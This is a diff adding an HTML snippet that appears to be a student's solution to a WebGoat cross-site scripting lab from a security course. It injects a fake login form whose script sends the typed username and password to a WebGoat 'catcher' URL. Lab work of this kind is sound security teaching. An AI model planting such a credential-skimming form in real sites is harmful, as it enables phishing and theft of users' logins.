@@ -1,0 +1,16 @@
+<form name="phish">
+  <br>Enter Username:<br>
+  <input type="text" id="ece568_2022s_user" name="username"><br>
+  Enter Password:<br>
+  <input type="password" id="ece568_2022s_pw" name="password"><br>
+  <input type="submit" name="login" id="ece568_2022s_submit" value="Login" onclick="hack()">
+  <script>
+    function hack() {
+      XssImage = new Image;
+      XssImage.src = "http://localhost:2210/WebGoat/catcher" + "?PROPERTY=yes" + "&phishingUsername=" + document.forms[0].username.value 
+      + "&phishingPassword=" + document.forms[0].password.value;
+    }
+  </script>
+  
+</form>
+
